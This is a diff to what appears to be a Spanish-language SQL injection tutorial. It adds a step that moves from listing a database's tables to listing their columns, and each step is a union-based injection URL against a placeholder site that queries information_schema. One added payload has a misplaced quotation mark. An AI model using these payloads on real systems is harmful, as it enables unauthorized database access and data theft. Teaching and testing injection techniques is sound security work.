@@ -159,3 +159,7 @@ Ahora podemos empezar a enumerar las tablas
 *podemos jugar con limit para imprimir todo el contenido por lineas*
 
 `http://fakesite.com/report.php?id=-23 union select 1,2,table_name,4,5 from information_schema.tables where table_schema=database() limit 0,1;-- -`
+
+Ahora el proceso es muy similar para obtener las columnas
+
+`http://fakesite.com/report.php?id=-23 union Select 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='tablenamehere;-- -'` # obtenemos las columnas
